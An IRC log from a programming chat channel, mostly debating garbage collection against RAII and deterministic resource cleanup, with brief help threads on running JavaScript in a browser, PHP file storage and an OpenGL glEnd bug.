[03:18:56] <InPhase> sonny: Because non-deterministic deletion is hard to reason, it disrupts good resource management, and it results in unstable bursts of bad performance that can cluster at very inopportune times, striking havoc on systems that need reliable run times for critical routines.
[03:19:05] *** Quits: inlight (~inlight@user/inlight) (Remote host closed the connection)
[03:19:06] <InPhase> s/hard to reason/hard to reason about/
[03:19:09] <sonny> I see
[03:19:15] <flakland> so it's the pilots fault for not switching the NOGC toggle?
[03:19:20] <sonny> lol
[03:19:40] <pulse> smart pointers are way more elegant than gc anyway
[03:19:42] <sonny> so I just need to understand that point so I can figure out how to reason with it
[03:19:44] <pulse> so just use that
[03:19:53] *** Joins: pitchshifter (~pitchshif@75.190.104.24)
[03:19:55] <InPhase> sonny: One of the most frustrating things about GC is that it's mutually incompatible with scope-based resource management.
[03:20:00] <sonny> smart pointer is just ref counting?
[03:20:28] <sonny> scope based == stack based?
[03:20:40] <InPhase> sonny: That problem strikes programs of all types, as an architectural problem.  But the performance issue can matter a lot in some systems level things.
[03:21:02] <InPhase> No, scope based and stack based are not the same thing.
[03:21:14] <InPhase> They operate at different levels of abstraction.
[03:21:23] <sonny> why not? just seems like you are using a stack implicitly
[03:22:02] <sonny> scope based also reminds me of the borrow checker in rust
[03:22:11] *** Joins: vysn (~vysn@user/vysn)
[03:22:17] <InPhase> No, it's a modality of design by which resources, as a generalized concept, are setup and torn down in a deterministic and predictable manner based on when they or containers containing them go out of scope.  https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization
[03:22:18] <bayaz> Title: Resource acquisition is initialization - Wikipedia 
[03:23:29] <sonny> "RAII only works for resources acquired and released (directly or indirectly) by stack-allocated objects, where there is a well-defined static object lifetime."
[03:23:29] <InPhase> So if you have a vector, the vector object exists on the stack, the vector allocates a set of objects on the heap, each of those objects can allocate more objects on the heap, and when that vector goes out of scope, all of those objects have destructors called on down the chain from leaf upward until the vector deallocates its storage and is popped off the stack at the last step.  The stack was 
[03:23:35] <InPhase> somewhat incidental to this.
[03:23:37] *** Quits: Enitin (~Enitin@82.102.22.86) (Ping timeout: 268 seconds)
[03:24:06] <sonny> ok
[03:24:13] *** Joins: Enitin (~Enitin@37.80.148.79)
[03:24:30] *** Quits: Enitin (~Enitin@37.80.148.79) (Remote host closed the connection)
[03:24:37] <sonny> I am thinking about making an OS and programming language, and this seems to be a big block
[03:24:49] <sonny> in reality people just want the flexibility I think
[03:25:20] <InPhase> The key step is that you can have objects that you can count on cleaning up everything they depend upon.  For example, objects can register to receive callbacks to themselves, and must unregister this before being deallocated.  This goes in the destructor, and you then predictably know that when that object is no longer in use, it is no longer receiving these callbacks.  You literally can't do this 
[03:25:26] <InPhase> with a garbage collection language, because there is no deterministic destruction.
[03:25:40] <InPhase> So it's not that garbage collection makes things easier.  At scale it makes them harder.
[03:25:48] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[03:26:16] *** Joins: loganlee (~Thunderbi@user/loganlee)
[03:26:45] <sonny> obj = null ?
[03:26:58] <InPhase> There are other deterministic ways to handle automatic resource management other than garbage collection, it just requires you to understand things like ownership models and make use of them.
[03:27:30] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[03:27:35] <edgar-rft> if you collect your garbage you can share it with others :-)
[03:27:36] <sonny> ok, I think I get the picture
[03:28:16] <InPhase> A good future language would probably not even have a new that does anything other than produce something that follows one of a chosen set of ownership models, so that the rules for deletion are defined up front.
[03:29:02] <flakland> it's only a matter of time now before someone writes a language that gives exclusive CPU access to a GC process
[03:29:22] <sonny> that sounds unportable
[03:29:22] *** Joins: Mangy_Dog (~Mange@user/mangy-dog/x-7397214)
[03:29:35] <EdFletcher> Rust has chosen and entirely different, but still deterministic, model (for example) 
[03:29:45] <flakland> well you can't do it on stock linux, if thats what you mean
[03:30:03] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[03:30:45] *** Quits: jsmooth (~quassel@2600:6c54:7b00:0:d5b1:b267:70d0:a4a5) (Changing host)
[03:30:45] *** Joins: jsmooth (~quassel@user/jsmooth)
[03:30:51] <sonny> I mean, the reality is there is no current language that lets you reason about memory allocation
[03:31:04] <sonny> so I wonder if we have been asking the wrong questions
[03:32:09] <pulse> some profilers have allocation graphs
[03:32:35] <sonny> I mean, "I have allocated properly"
[03:32:45] <sonny> and allow you to make the steps to get their
[03:32:52] <sonny> s/their/there/
[03:33:01] <pulse> all allocations are proper, unless they go out of memory bounds :p
[03:33:07] <pulse> deallocations are usually more problematic
[03:33:17] <pulse> there's leak detectors though. and they work pretty damn good
[03:33:31] <sonny> it's too late by the time it's a leak
[03:33:40] <sonny> who knows what effect that will have on the plane
[03:33:47] <pulse> that's what testing is for
[03:33:51] <InPhase> If you have leaks, you probably made a serious design flaw by that point.
[03:34:05] <sonny> could be
[03:34:07] <pulse> it's sometimes hard to reason about deallocation
[03:34:27] <pulse> in multithreaded contexts for example
[03:34:31] <InPhase> That's why you get the language to do it for you by establishing guarantees.
[03:34:36] *** Quits: jsmooth (~quassel@user/jsmooth) (Quit: jsmooth)
[03:34:44] <pulse> a leak detector is a very nice tool to have handy
[03:35:37] *** Joins: arkanoid (~arkanoid@2-238-151-49.ip244.fastwebnet.it)
[03:36:14] <PlanckWalk> I heard that Rust tries very hard to make some guarantees about memory, but I haven't used it yet.
[03:37:07] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[03:38:02] *** Quits: Soni (~quassel@autistic.space) (Ping timeout: 240 seconds)
[03:39:39] *** zaher__ is now known as zaher
[03:39:39] <InPhase> pulse: So I don't mind the leak detectors existing.  It's nice to have a fallback, and sometimes you get disastrous code dropped in your lap and you need to understand what's going wrong with it.  Also, sometimes you made a design flaw and you can't figure it out.  But usage of leak detectors should generally end up rare, because one should respond to each leak not by fixing the leak, but by asking 
[03:39:45] <InPhase> how things can be rearchitected so the leak errors are impossible to make.
[03:40:18] *** Joins: Tech_8 (~Tech_8@24.51.61.131)
[03:40:20] <Tech_8> sup
[03:43:00] <nomagno> InPhase: If you define a leak as losing a pointer to some allocated memory, it's not really viable to settle for a program architecture that makes this impossible without a performance loss
[03:43:17] <nomagno> ... In languages where the leaks are possible, anyways
[03:43:45] <InPhase> nomagno: Sure it is.
[03:44:14] <nomagno> Well, you can do the old trick of passing a pointer to an empty data structure
[03:44:15] <InPhase> Unless you count "actually doing the deallocation you needed to do" in the performance metric.  :)
[03:44:53] *** Quits: monkey_ (~user@190.104.116.153) (Remote host closed the connection)
[03:45:06] <nitrix> There are space leaks where things are kept in data structures needlessly during execution, and neither a static approach, nor a runtime approach would solve that.
[03:46:17] <nitrix> The lifetime is determined by invariants that you simply cannot encode in the type system. You'd think it's the exception, but it's the majority of cases.
[03:46:36] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[03:46:41] <nomagno> nitrix: Well that's fundamentally not a leak if the code author is more comfortable with doing memory copies for whatever reason, which is common
[03:46:57] <nomagno> Unless I didn't get you
[03:47:01] <pulse> InPhase, idk, at one point i was dealing with a lot of legacy code and without a leak detector i would have to comb through 100 thousand lines of code and probably still not find the leak
[03:47:34] *** Quits: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com) (Remote host closed the connection)
[03:47:47] <pulse> it's also nice to have some kind of a sanity check before you push into production
[03:47:48] <nomagno> For instance I don't think my C code does a single malloc currently
[03:48:06] *** Joins: Soni (~quassel@autistic.space)
[03:48:08] <InPhase> nomagno: Please tell me which routine will be faster:  https://godbolt.org/z/bffjq9r1M
[03:48:09] <bayaz> Title: Compiler Explorer - C++ (x86-64 gcc 11.2) 
[03:48:11] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[03:48:42] <InPhase> nomagno: The assembly comparison is on the right side.
[03:49:10] <nomagno> Lemme look at the assembly yes because I'm not a C++ programmer
[03:49:16] *** Joins: TonyStone (~TonyStone@cpe-74-76-51-197.nycap.res.rr.com)
[03:49:32] <nitrix> nomagno, A trivial example, a chat application. A user joins, there's metadata kept about the user that's connected, they leave, the data has to be cleaned up. Sure, once that's triggered (delete user nomago from the users hashmap) then everything gets cleaned up recursively because static analysis generated the proper code, or perhaps a garbage collector finds it in the next mark phase and sweeps it later, but it ultimately relies on the user to 
[03:49:32] <nitrix> trigger the deletion.
[03:50:27] <nomagno> InPhase: Doesn't take a genius to figure out they're identical :D
[03:50:34] <InPhase> nomagno: Indeed.  :)
[03:50:37] *** Quits: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Ping timeout: 240 seconds)
[03:51:26] <InPhase> nomagno: C programmers are used to things having an overhead, so they look at the C++ abstractions and assume they will be slow.  But in fact they're generally designed to be as zero-cost as possible and compile down to the same thing, just with the guarantees provided at compile time.
[03:51:40] *** Joins: medium_cool (~medium_co@2605:a601:a9aa:f800:5572:85e6:1399:6185)
[03:51:50] <InPhase> nomagno: All it really did by the time the optimizer had its say, is insert the same delete I would have put there manually, but the error becomes impossible.
[03:52:13] <nitrix> nomagno, Like, people think manual memory management is complicated, but they're already doing it all the time maintaining those data structures and we have no good tools for that. The silly things we solves with RAII or GC like sharing, passing variables around or scope stuff is minuscule compared to that.
[03:52:48] <nomagno> I adopt a coding style in C that essentially gets rid of memory allocation
[03:53:29] *** Joins: tomathy (~jenova@user/quetzl)
[03:53:33] <tomathy> i eata anta pasta twice just because she is so nice, angelina
[03:53:33] <InPhase> nomagno: The idiomatic C++ style gets rid of manual allocation, and has a structure that looks just like you would get if you had no allocation at all, with everything scope-based like as if it were on the stack, but you can still use as much memory as you want on the heap.
[03:53:57] <pulse> i just use a lot of raii :p
[03:54:07] <nitrix> InPhase, My C code looks just like that. It's not a C++ thing.
[03:54:32] <InPhase> nitrix: It's not possible in C.
[03:55:01] <nitrix> I just said that I do it.
[03:55:03] <InPhase> nitrix: The moment you have an array of pointers in C, you're also responsible for looping over them and freeing them.  There is no other choice for clean-up.
[03:55:12] <nomagno> Axiom 1 of NomagnoStack-Style™: Thy shall replace the returning of pointeurs with the passage of pointeurs to subroutines as arguments, so the stack may become thy supreme form of memory management. If you don't do this I break your legs.
[03:55:15] <pulse> impossible you say? *writes a bunch of overly clever macros*
[03:55:29] <flakland> one choice is to neglect deallocation completely
[03:55:34] <nitrix> Don't have an array of pointers.
[03:55:40] <pulse> yes. let the OS take care of all that jazz
[03:55:41] <InPhase> flakland: Leak all the memory?
[03:55:58] <InPhase> nitrix: So you restrict all code to fit into a 1MB Windows stack limit?  :)
[03:56:04] <flakland> not ideal for long-lived processing
[03:56:08] <flakland> ;)
[03:56:12] <nomagno> nitrix: necessary for dynamic stuff at some point
[03:56:19] <pulse> eh, just autorestart the process :p
[03:56:27] <pulse> [thinking man meme]
[03:56:44] <nomagno> For instance the highest level of my interface has a single point of memory allocation, for arbitrary resolution pixel buffer
[03:57:11] <InPhase> My code often uses gigabytes through tens of gigabytes.  It can be very challenging to convince some platforms to let you use a stack that large.
[03:57:23] <nomagno> ^
[03:58:41] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[03:59:02] *** Quits: aradesh (~aradesh@user/aradesh) (Quit: WeeChat 1.9.1)
[03:59:10] <InPhase> Although I will add that I DO think we should have unlimited stack support on every platform.  This seems to me a perfectly valid programming style suitable for some problems that are nicely recursive in nature.
[03:59:12] *** Joins: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad)
[03:59:47] <flakland> new stack is just a clone call away on linux
[04:00:27] <InPhase> flakland: Linux is one where you can already get an unlimited stack if you want, it's just frowned upon.
[04:00:48] <flakland> yeah because hopefully they're smart enough to not page the stack to disk
[04:01:02] <flakland> so it's a big memory hog if so
[04:01:06] <InPhase> MacOS dropped unlimited stack support, going in the opposite direction.
[04:01:53] <nomagno> Some platforms don't even have a proper hardware call stack
[04:01:54] *** Joins: chenqisu1 (~bhca7d@183.217.201.21)
[04:03:32] *** Quits: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad) (Ping timeout: 240 seconds)
[04:08:58] *** Joins: omr (~omr@user/omr)
[04:10:37] *** Quits: morte_ (~user@190.104.116.153) (Ping timeout: 240 seconds)
[04:10:37] *** Quits: rickybob (~rickybob@gateway/vpn/pia/rickybob) (Ping timeout: 240 seconds)
[04:11:28] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[04:11:39] *** Joins: horseface (~horseface@user/horseface)
[04:11:49] *** Quits: Pickchea (~private@user/pickchea) (Ping timeout: 256 seconds)
[04:16:17] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 240 seconds)
[04:18:08] *** Joins: Lyn (~Lyn@dyn65-59.yok.fi)
[04:18:32] *** Lyn is now known as Guest8449
[04:19:10] *** Quits: Guest8449 (~Lyn@dyn65-59.yok.fi) (Changing host)
[04:19:10] *** Joins: Guest8449 (~Lyn@user/law)
[04:21:55] *** Guest8449 is now known as Lyn
[04:23:02] *** Quits: Lyn (~Lyn@user/law) (Quit: Leaving)
[04:25:14] *** Joins: victori (~victori@cpe-76-174-179-126.socal.res.rr.com)
[04:25:17] *** Quits: Rounin (~david@84.212.130.215) (Ping timeout: 240 seconds)
[04:25:26] *** Quits: Jupp_S (~quassel@ip-88-153-154-129.hsi04.unitymediagroup.de) (Remote host closed the connection)
[04:31:42] *** Quits: brabrax (~brabrax@user/brabrax) (Quit: ZNC 1.8.2 - https://znc.in)
[04:32:32] *** Joins: brabrax (~brabrax@user/brabrax)
[04:34:44] <arkanoid> I have a single .js file that I want to run inside a browser without having to manually write index.html that loads it
[04:35:04] <arkanoid> something like "firefox myscript.js" at command line, but this opens it as text instead
[04:35:55] <pulse> why browser and not node
[04:36:21] *** Quits: freepp (~freepppp@62.1.245.43.dsl.dyn.forthnet.gr) (Read error: Connection reset by peer)
[04:37:11] <arkanoid> pulse: because the js draws a gui
[04:37:12] *** Quits: ThePhilgrim (~ThePhilgr@78-69-18-227-no49.tbcn.telia.com) (Remote host closed the connection)
[04:37:38] *** Quits: Miffo (~Twipply@user/twipply) (Quit: Leaving)
[04:37:57] *** Quits: Macuser (~Macuser@2600:1003:b46e:747e:c053:f977:a2d4:e642) (Ping timeout: 240 seconds)
[04:38:00] <arkanoid> it requires a window context
[04:38:28] <pulse> you can always just put the js inside the html :p
[04:38:35] <pulse> if you don't like to have 2 files
[04:41:05] <PlanckWalk> Eww.
[04:41:14] <PlanckWalk> You have to escape all the things then
[04:41:17] *** Quits: kish` (~aqua@user/aqua) (Remote host closed the connection)
[04:41:55] *** Joins: kish` (~aqua@user/aqua)
[04:41:56] *** Joins: zaher_ (~zaher@37.48.191.217)
[04:42:48] <arkanoid> quite surprised there's no trivial option for this. I always end up writing a minimal index.html, what a waste
[04:44:41] *** Joins: Macuser (~Macuser@2600:1003:b451:8e4a:98b8:e5ae:6160:1cad)
[04:45:49] *** Quits: zaher (~zaher@188.160.231.240) (Ping timeout: 256 seconds)
[04:48:17] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[04:48:54] *** Joins: kaph_ (~kaph@net-2-38-107-19.cust.vodafonedsl.it)
[04:48:55] *** Quits: kaph_ (~kaph@net-2-38-107-19.cust.vodafonedsl.it) (Remote host closed the connection)
[04:49:13] *** Quits: Mangy_Dog (~Mange@user/mangy-dog/x-7397214) (Ping timeout: 256 seconds)
[04:51:55] *** Quits: kaph (~kaph@net-2-38-107-19.cust.vodafonedsl.it) (Ping timeout: 256 seconds)
[04:53:20] *** Quits: Auron (~Auron956@user/auron) (Remote host closed the connection)
[04:54:02] *** Quits: ozarker (~ozarker@user/ozarker) (Ping timeout: 240 seconds)
[04:54:55] *** Joins: smoke (~smoke@user/smoke)
[04:55:10] *** Quits: smoke (~smoke@user/smoke) (Max SendQ exceeded)
[04:55:28] *** Joins: smoke (~smoke@user/smoke)
[04:55:56] *** Joins: ozarker (~ozarker@user/ozarker)
[04:58:04] *** Quits: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Quit: Going offline, see ya! (www.adiirc.com))
[05:01:18] *** Joins: job (~job@wikimedia-commons/pandakekok9)
[05:03:25] *** Quits: pulse (~pulse@user/pulse) (Quit: Join a gamedev community @ https://indiedevs.net/)
[05:07:56] *** Quits: smoke (~smoke@user/smoke) (Quit: Leaving)
[05:11:10] *** Quits: omr (~omr@user/omr) (Quit: WeeChat 3.3)
[05:12:34] *** Joins: cheer (~cheer@cpe-76-189-213-198.neo.res.rr.com)
[05:14:22] *** Quits: medium_cool (~medium_co@2605:a601:a9aa:f800:5572:85e6:1399:6185) (Quit: I have gone to sleep. ZZZzzz…)
[05:14:36] *** Joins: MrBungle (~MrBungle@2604:3d08:1788:dc00:e80b:197f:ca5b:a131)
[05:19:40] *** Quits: grumb (~grumb@rint.osaka) (Quit: Ping timeout (120 seconds))
[05:20:03] *** Joins: grumb (~grumb@rint.osaka)
[05:21:23] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[05:26:09] *** Quits: cheer (~cheer@cpe-76-189-213-198.neo.res.rr.com) (Quit: WeeChat 3.4)
[05:27:04] *** Joins: pulse (~pulse@user/pulse)
[05:27:26] *** Joins: jazzy (~jaziz@user/jaziz)
[05:29:40] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[05:30:05] *** Joins: herjazz (~herjazz@p6758124-ipngn30801marunouchi.tokyo.ocn.ne.jp)
[05:33:19] *** Joins: morte_ (~user@190.104.116.153)
[05:34:56] *** Quits: src__ (~src@user/src) (Quit: Leaving)
[05:35:15] *** Joins: horseface_ (~horseface@user/horseface)
[05:37:32] *** Quits: horseface (~horseface@user/horseface) (Ping timeout: 240 seconds)
[05:43:10] *** Joins: yBtNJW3j (~aib9Zume@71.50.58.137)
[05:43:57] *** Quits: night_wulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com) (Ping timeout: 240 seconds)
[05:45:28] *** Joins: night_wulfe (~wulfe@cpe-174-103-156-213.cinci.res.rr.com)
[05:51:11] *** Quits: jaysicks (~jaysicks@178-164-152-202.pool.digikabel.hu) (Remote host closed the connection)
[05:51:24] *** Quits: Teckla (~Teckla@user/teckla) (Quit: leaving)
[05:53:05] *** Joins: brabrax_ (~brabrax@user/brabrax)
[05:53:57] *** Quits: brabrax (~brabrax@user/brabrax) (Ping timeout: 240 seconds)
[05:53:57] *** brabrax_ is now known as brabrax
[05:54:56] *** Joins: Duchess (~Duchess@2604:3d08:1:1b:564:6e0:6753:4df1)
[05:55:27] *** Joins: Teckla (~Teckla@user/teckla)
[05:58:17] *** Quits: Macuser (~Macuser@2600:1003:b451:8e4a:98b8:e5ae:6160:1cad) (Quit: Textual IRC Client: www.textualapp.com)
[05:59:55] *** Joins: zaher__ (~zaher@37.48.150.46)
[06:02:17] *** Quits: zaher_ (~zaher@37.48.191.217) (Ping timeout: 240 seconds)
[06:04:53] *** Quits: newpy (~newpy@206.168.231.90) (Quit: Leaving)
[06:05:25] *** Quits: chenqisu1 (~bhca7d@183.217.201.21) (Ping timeout: 240 seconds)
[06:07:52] *** Joins: mugen (~mugen@gateway/tor-sasl/mugen)
[06:09:04] *** Joins: mattallmill (~mattallmi@ip68-103-130-85.ks.ok.cox.net)
[06:09:23] *** Quits: XV8 (~XV8@2601:5cb:c001:50:c524:87c6:af5c:7cdb) (Quit: Textual IRC Client: www.textualapp.com)
[06:09:49] *** Quits: xff0x (~xff0x@2001:1a81:5335:ab00:6ff0:ac84:9d3f:2b35) (Ping timeout: 240 seconds)
[06:10:09] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[06:10:42] *** Quits: mug3n_ (~mugen@gateway/tor-sasl/mugen) (Ping timeout: 276 seconds)
[06:11:44] *** Joins: xff0x (~xff0x@2001:1a81:5370:9b00:cd1d:3c45:12cd:b91e)
[06:13:53] <tomathy> hi 
[06:14:09] <tomathy> i've got a python server for a basic website 
[06:14:21] <tomathy> but i need to execute a PHP file to store some user information
[06:14:44] <tomathy> how do i do that?
[06:15:08] <tomathy> no SQL just a sequence of data in a file
[06:15:54] *** dodo__ is now known as dodo
[06:16:00] <tomathy> would it be easier to do it via python somehow?
[06:16:44] <tomathy> what lilnux command would run the php file?
[06:17:23] <tomathy> i think i'm a bit confused about how this works
[06:17:36] <tomathy> the client has the html file, and will click submit, where does that data go?
[06:17:53] <tomathy> will the server take it?
[06:18:00] *** Joins: amigojapan (uid86330@id-86330.helmsley.irccloud.com)
[06:18:33] *** Joins: mishugana (~mishugana@user/mishugana)
[06:18:33] *** Quits: mishugana (~mishugana@user/mishugana) (Client Quit)
[06:18:43] *** Joins: mishugana (~mishugana@user/mishugana)
[06:18:45] <flakland> not enough info
[06:19:16] <amigojapan> It seems someone lied to me and you can't actually execute swift code on an iPad yet... I am annoyed that they would lie
[06:20:46] <flakland> for reals?
[06:21:50] *** Quits: whatsupdoc (uid509081@id-509081.hampstead.irccloud.com) (Quit: Connection closed for inactivity)
[06:22:38] <flakland> there must be some grand excuse why, it's strange
[06:23:12] <amigojapan> Yeah they said that when I said that the thing that most annoys me about apple is that they force you to buy two expensive items just to start coding
[06:23:17] *** Quits: zaher__ (~zaher@37.48.150.46) (Ping timeout: 256 seconds)
[06:24:49] <amigojapan> But I guess Apple fan boys will bareface lie to defend their preference
[06:25:40] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[06:25:53] *** Joins: flakland (~flaknet99@32.211.211.39)
[06:30:06] *** Joins: Lazenca (Lazenca@user/lazenca)
[06:31:19] *** Joins: jamea (~jamea@177.239.81.39)
[06:34:45] *** Quits: lemonsnicks (~lemonsnic@cpc159519-perr18-2-0-cust114.19-1.cable.virginm.net) (Quit: ZNC 1.8.2 - https://znc.in)
[06:35:34] *** Joins: password2 (~password8@user/password2)
[06:35:37] *** Quits: jamea (~jamea@177.239.81.39) (Ping timeout: 240 seconds)
[06:36:28] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[06:39:07] *** Joins: Jupp_S (~quassel@ip-88-153-154-129.hsi04.unitymediagroup.de)
[06:46:11] *** Quits: penguino (~mrpenguin@user/mrpenguin) (Remote host closed the connection)
[06:46:32] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[06:46:40] *** Joins: lemonsnicks (~lemonsnic@cpc159519-perr18-2-0-cust114.19-1.cable.virginm.net)
[06:52:54] *** Joins: wuldor (~daddy@84.71.242.153)
[06:54:25] <wuldor> https://bpa.st/EW6A
[06:54:26] <bayaz> Title: View paste EW6A 
[06:55:06] <wuldor> I'm trying to draw two polygons, here, but only one draws, until after a while where the other one appears but not as I intended, any ideas?
[06:56:04] *** Joins: Jong (~Jong@2620:10d:c090:400::5:f0a6)
[06:57:37] *** Quits: morte_ (~user@190.104.116.153) (Ping timeout: 240 seconds)
[06:59:17] *** Quits: audiobirb (~audio@user/audio) (Ping timeout: 240 seconds)
[06:59:56] *** Quits: Tech_8 (~Tech_8@24.51.61.131) (Quit: Client closed)
[07:02:58] <wuldor> think it could be harware related?
[07:05:48] *** Joins: jamea (~jamea@177.239.81.39)
[07:08:05] <PlanckWalk> Your polygons don't appear to be closed
[07:08:27] <wuldor> How do I close them?
[07:08:32] <PlanckWalk> There may be other bugs, but that one jumped out at me
[07:09:21] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[07:09:25] <pulse> sir please close your polygons
[07:09:27] <PlanckWalk> Also there's no GL_END
[07:09:29] <wuldor> Do I need to duplicate the first element?
[07:09:33] <PlanckWalk> Err glEnd
[07:09:36] <PlanckWalk> Yes
[07:09:43] <PlanckWalk> Or at least, send it to gl
[07:10:05] <wuldor> so I can send it without having the repeat the first element? if so, how?
[07:10:11] *** Quits: jamea (~jamea@177.239.81.39) (Ping timeout: 256 seconds)
[07:10:18] <PlanckWalk> And whenever you have a glBegin, you need to have a glEnd
[07:10:26] <PlanckWalk> Another glVertex3f call
[07:10:29] *** Joins: fe23 (~fe23@2409:8a34:464:4990:6569:123c:45b7:c36f)
[07:10:46] <wuldor> ah, I deleted glEnd by mistake
[07:12:43] <wuldor> alright sorted, thanks.
[07:13:10] *** Quits: pretty_dumm_guy (trottel@gateway/vpn/protonvpn/prettydummguy/x-88029655) (Quit: WeeChat 3.4)
[07:13:22] *** Quits: FreeFull (~freefull@user-5-173-31-70.play-internet.pl) ()
[07:14:29] <PlanckWalk> Ah, I'd forgotten that GL_POLYGON mode closes the polygon on glEnd
[07:15:05] *** Joins: sheepduck (~sheepduck@user/sheepduck)
[07:15:20] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[07:16:02] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[07:17:54] *** Quits: bmahe[m] (~bmahematr@2001:470:69fc:105::d140) (Quit: Client limit exceeded: 20000)
[07:18:25] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[07:20:23] *** Quits: sheepduck (~sheepduck@user/sheepduck) (Ping timeout: 256 seconds)
[07:23:39] <KillerWasp> https://www.allegro.cc/forums/thread/618579/1051478#target
[07:23:40] <bayaz> Title: TowerLucky 
[07:23:51] *** Joins: bmahe[m] (~bmahematr@2001:470:69fc:105::d140)
[07:25:01] *** Joins: sheepduck (~sheepduck@user/sheepduck)
[07:26:09] *** Quits: itsalexjones__ (~itsalexjo@82.4.99.241) (Read error: Connection reset by peer)
[07:27:22] *** Joins: LordJohn (~lordjohn@l37-192-203-250.novotelecom.ru)
[07:28:35] *** Joins: b1101 (~b1101@pool-100-33-96-155.nycmny.fios.verizon.net)
[07:31:22] *** Joins: CodeSpelunker (~CodeSpelu@user/codespelunker)
[07:38:31] *** Quits: mattallmill (~mattallmi@ip68-103-130-85.ks.ok.cox.net) (Ping timeout: 256 seconds)
[07:41:46] *** Parts: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Closing Window)
[07:42:34] *** Quits: surgeon[m] (~surge9nma@2001:470:69fc:105::f585) (Quit: Client limit exceeded: 20000)
[07:44:47] <KillerWasp> anyone here work with dovecot and postfix?
[07:44:48] *** Joins: surgeon[m] (~surge9nma@2001:470:69fc:105::f585)
[07:45:19] *** Joins: cheer (~cheer@cpe-76-189-213-198.neo.res.rr.com)
[07:49:59] *** Norkle_ is now known as Norkle
[07:52:25] *** Quits: stagas__ (~stagas@2a02:587:c427:67f9:a503:3d77:3c9f:dde9) (Ping timeout: 250 seconds)
[07:52:49] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[07:55:12] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[07:59:51] *** Joins: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad)
[08:04:17] *** Quits: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad) (Ping timeout: 240 seconds)
[08:10:27] *** Joins: leduyquang753 (~leduyquan@user/leduyquang753)
[08:11:20] *** Joins: duckworld (~duckworld@user/duckworld)
[08:12:49] *** Joins: ormaaj (~ormaaj@user/ormaaj)
[08:14:31] *** Joins: Gentpup (~Gentpup@217.75.212.43)
[08:20:01] *** Quits: password2 (~password8@user/password2) (Ping timeout: 256 seconds)
[08:24:57] *** Quits: cthulchu (~Cthulchu@184-090-172-137.res.spectrum.com) (Ping timeout: 240 seconds)
[08:31:32] *** Joins: frost (~frost@user/frost)
[08:32:32] *** Quits: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470) (Ping timeout: 240 seconds)
[08:36:37] *** Quits: Cashlin (~hp@user/cashlin) (Quit: Konversation terminated!)
[08:36:46] *** Joins: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470)
[08:38:18] *** Quits: b1101 (~b1101@pool-100-33-96-155.nycmny.fios.verizon.net) (Quit: b1101)
[08:40:08] *** Quits: sdfgsdfg (~sdfgsdfg@user/sdfgsdfg) (Quit: ZzzZ)
[08:45:03] *** Joins: Daemonick (~Daemonick@77.49.175.20.dsl.dyn.forthnet.gr)
[08:45:19] <Daemonick> Hi devs!
[08:48:02] <sonny> hello
[08:54:14] <Daemonick> I have an issue about playing a video game, "Dyson Sphere Program"
[08:54:32] <norias> oh?
[08:54:39] <Daemonick> It is like 'Factorio'
[08:54:45] *** Joins: Guest80 (~Guest80@S01069050ca4e3573.cg.shawcable.net)
[08:54:56] <norias> lost me m8
[08:55:01] <Daemonick> If the ingredients of making a material have different analogies
[08:55:33] <Daemonick> I wrote a database to store these analogies
[08:55:53] <Daemonick> Where to post it in order to see of your own?
[08:56:04] <beaky> master of debugging https://blog.jhm.dev/posts/papers-please/
[08:56:05] <bayaz> Title: Fixing stutters in Papers Please on Linux ? Blog 
[08:57:58] *** Quits: CodeSpelunker (~CodeSpelu@user/codespelunker) (Quit: CodeSpelunker)
[08:59:56] <sonny> beaky: what should I blog about?
[09:01:55] <beaky> a blog about solving advent of code puzzles in the most elegant way 
[09:01:56] *** Joins: sdfgsdfg (~sdfgsdfg@user/sdfgsdfg)
[09:05:38] *** Quits: cornedor[m] (~cornedorm@2001:470:69fc:105::ffd7) (Quit: Client limit exceeded: 20000)
[09:06:11] <sonny> ok, that's not too bad
[09:06:23] <sonny> beaky any particular language?
[09:06:25] *** Joins: cornedor[m] (~cornedorm@2001:470:69fc:105::ffd7)
